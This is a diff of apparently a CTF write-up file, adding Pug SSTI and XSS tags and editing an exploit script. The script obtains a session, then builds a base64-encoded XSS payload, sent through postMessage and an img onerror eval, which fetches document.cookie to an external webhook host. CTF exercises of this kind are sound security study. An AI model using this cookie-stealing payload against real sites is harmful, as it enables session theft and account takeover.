@@ -6,6 +6,9 @@ tags:
   - web
   - CTF 
   - Pug SSTI
+  - XSS with ISO-2022-JP
+  - pp 
+  - 
 ---
 
 # CTF Challenges 
@@ -353,8 +356,8 @@ import httpx
 import base64
 import datetime
 
-DOMAIN = ""  # Change
-oast = "aaa.oastify.com"  # Change
+DOMAIN = ""  
+WEBHOOK = "" 
 
 # Get a session
 async with httpx.AsyncClient() as client:
@@ -363,7 +366,7 @@ async with httpx.AsyncClient() as client:
     sid = login_res.cookies.get("SID")
     print(f"[+] session retrieved successfully: {sid}")
 
-    extract_flag = "(async () => {await fetch(`https://" + oast + "/?${document.cookie}`);})();"
+    extract_flag = "(async () => {await fetch(`https://" + WEBHOOK + "/?${document.cookie}`);})();"
     post_message_payload = f"(async () => {{parent.postMessage({{\"totalTasks\":\"<img/src/onerror=eval(atob('{base64.b64encode(extract_flag.encode('utf-8')).decode()}'))>\"}},'*');}})()"
     payload = {
         "name": "Anon",
